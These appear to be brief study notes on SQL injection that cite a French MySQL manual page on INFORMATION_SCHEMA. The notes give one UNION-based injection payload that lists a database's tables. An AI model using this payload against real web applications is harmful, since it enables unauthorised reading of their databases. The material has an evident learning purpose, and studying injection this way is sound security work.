`SQL injection`
> sur la page 


https://mysql.developpez.com/tutoriels/manuel-de-reference-mysql-5-0/?page=La-base-de-donnees-d-informations-INFORMATION-SCHEMA#:~:text=INFORMATION_SCHEMA%20est%20la%20%C2%AB%20base%20de,plusieurs%20tables%20en%20lecture%20seule.


1 or 1=1 UNION SELECT table_name, table_type FROM information_schema.tables where table_type like 'base table'